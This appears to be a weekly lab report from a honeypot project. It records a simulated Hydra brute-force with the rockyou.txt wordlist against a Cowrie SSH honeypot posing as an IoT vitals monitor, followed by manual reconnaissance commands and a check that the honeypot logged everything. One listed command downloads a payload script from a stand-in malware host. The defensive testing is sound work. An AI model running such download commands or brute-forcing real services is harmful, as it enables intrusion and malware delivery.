# 🟡 Week 2 — Exposure & Data Capture

## Objective

To simulate real-world cyberattacks against the deployed honeypot and verify that all attacker activities are accurately captured and logged within a controlled environment.

---

## 🛠️ Implementation Details

### 1. Brute-Force Attack Simulation (Hydra)

* Performed automated brute-force attacks using Hydra from Kali Linux
* Targeted the Cowrie SSH honeypot running on **port 2222**
* Utilized the **rockyou.txt** wordlist for password attempts
* Simulated multiple credential combinations to mimic real attacker behavior
* Observed multiple successful login attempts (expected behavior in honeypot environment)

---

### 2. Manual SSH Attack

* Established SSH connection to the honeypot using discovered credentials
* Successfully accessed the simulated environment
* Verified device identity:

  * Hostname displayed as **`vitals-monitor-04`**, confirming successful IoT device simulation
* Interacted with the system to emulate attacker activity

---

### 3. Attacker Command Execution

Executed common reconnaissance and system exploration commands:

* `whoami` — Identified current user privileges
* `ls /root` — Explored restricted directories
* `ps aux` — Enumerated running processes
* `netstat -an` — Inspected active network connections
* `wget http://malware.test/payload.sh` — Simulated malicious payload download

These commands represent typical attacker behavior post-compromise.

---

### 4. Log Capture & Verification

* Verified that all attacker interactions were successfully recorded by Cowrie
* Logs stored in:

  * `cowrie.log` — Detailed textual logs of attacker sessions
  * `cowrie.json` — Structured JSON logs for analysis
* Captured data includes:

  * Attacker IP address
  * Username and password attempts
  * Commands executed
  * Session activity

---

##  Result

* Successfully simulated both manual and automated (brute-force) attacks
* Captured complete attacker behavior without detection
* Verified real-time logging and data collection capabilities of the honeypot

---

##  Evidence

* `logs/cowrie.log` — Full attacker interaction logs
* `logs/cowrie.json` — Structured log data for further analysis

---

##  Tools & Technologies Used

* Hydra (Brute-force attack simulation)
* rockyou.txt (Password wordlist)
* Kali Linux (Attacker machine)
* Cowrie SSH Honeypot
